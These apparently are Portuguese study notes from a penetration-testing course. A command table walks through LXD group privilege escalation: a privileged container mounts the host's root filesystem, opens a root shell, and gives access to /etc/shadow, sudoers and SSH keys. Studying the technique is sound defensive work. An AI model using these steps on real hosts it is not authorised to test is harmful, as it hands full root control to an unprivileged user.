# LXD Commands

| Comando | Para que serve | Resultado esperado |
|---|---|---|
| `id` | Verificar a qual grupo o usuário atual pertence (checar se está em `lxc` ou `lxd`) | Lista de grupos, ex.: `groups=1000(container-user),116(lxd)` |
| `cd ContainerImages` | Navegar até o diretório onde templates de containers costumam estar armazenados | Diretório alterado com sucesso |
| `ls` | Listar arquivos no diretório atual (procurando templates `.tar.xz`) | Lista de arquivos, ex.: `ubuntu-template.tar.xz` |
| `lxc image import ubuntu-template.tar.xz --alias ubuntutemp` | Importar um template de container local como imagem LXC, atribuindo um alias | Imagem importada e disponível para uso |
| `lxc image list` | Listar todas as imagens LXC disponíveis localmente | Tabela com alias, fingerprint, descrição, arquitetura, tipo e tamanho da imagem |
| `lxc init ubuntutemp privesc -c security.privileged=true` | Criar (inicializar) um novo container a partir da imagem importada, com a flag `security.privileged=true` que desativa isolamentos de segurança padrão | Container `privesc` criado em modo privilegiado |
| `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true` | Montar o filesystem raiz (`/`) do host dentro do container, no caminho `/mnt/root`, de forma recursiva | Dispositivo de disco adicionado à configuração do container |
| `lxc start privesc` | Iniciar o container configurado | Container em execução |
| `lxc exec privesc /bin/bash` | Executar um shell interativo dentro do container (obter acesso ao shell) | Shell `root@nix02` aberto dentro do container |
| `ls -l /mnt/root` | Listar o conteúdo do filesystem do host montado dentro do container, agora acessível como root | Listagem completa da raiz (`/`) do sistema host, com permissões e propriedades originais |

## Observação
Como o container roda em modo `security.privileged=true` e o filesystem do host é montado dentro dele, o usuário passa a ter acesso de **root** a todo o sistema de arquivos do host (`/mnt/root`), permitindo escalonamento total de privilégios (ex.: editar `/etc/shadow`, `/etc/sudoers`, chaves SSH, etc. via o caminho montado).
